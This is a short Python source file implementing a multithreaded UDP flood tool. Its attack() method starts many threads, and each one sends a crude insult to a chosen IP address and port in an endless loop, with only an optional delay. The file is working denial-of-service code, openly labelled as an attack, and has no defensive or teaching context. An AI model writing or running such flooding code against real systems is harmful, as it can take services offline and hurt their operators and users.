import threading
from colorama import init, Fore, Back, Style
from socket import *
import time

class UDP:

  def __init__(self, ip, port, sleep_time, threading_count):
    self.ip = ip
    self.port = port
    self.sleep_time = sleep_time
    self.threading_count = threading_count
    

  def attack(self):

    threads = []

    def begin():

      while True:

        s = socket(AF_INET, SOCK_DGRAM)

        s.connect((self.ip, self.port))

        s.send(bytes("fUCK YOU!", "utf-8"))

        if self.sleep_time:
          time.sleep(self.sleep_time)

    for i in range(self.threading_count):
      thread = threading.Thread(target=begin)
      thread.start()
      threads.append(thread)